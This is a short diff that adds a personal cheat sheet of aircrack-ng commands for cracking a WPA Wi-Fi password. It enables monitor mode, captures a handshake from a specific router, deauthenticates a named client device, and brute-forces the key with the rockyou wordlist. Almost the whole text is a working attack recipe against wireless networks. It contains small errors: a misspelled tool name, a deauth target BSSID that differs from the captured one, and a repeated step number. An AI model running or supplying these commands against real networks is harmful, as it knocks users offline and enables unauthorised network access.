@@ -1,0 +1,10 @@
+1) airmon-ng check kill - kill all processes that could cause trouble
+2) airmon-ng start wlan0 
+3) airodump-ng wlan0mon - start monitor mode
+4) airodump-ng --bssid 84:16:F9:C7:20:8E --channel 7 -w /home/fedal28/Downloads/wifi/wifi wlan0mon -create capture of network(84:16...) and save it to the file(...wifi)
+5) ireplay-ng --deauth 0 -a 50:46:5D:87:18:48 -c 5C:D0:6E:7A:3B:3A wlan0mon - kill the session of the network(in new window)
+5) wpaclean /home/fedal28/Downloads/wifi/clean_hand /home/fedal28/Downloads/wifi/wifi-01.cap - clean that file and save to new(...clean_hand)
+6) aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 84:16:f9:c7:20:8e /home/fedal28/Downloads/wifi/clean_hand - bruteforce the network
+7) airmon-ng stop wlan0mon
+8) ifconfig wlan0 up
+9) service NetworkManager restart
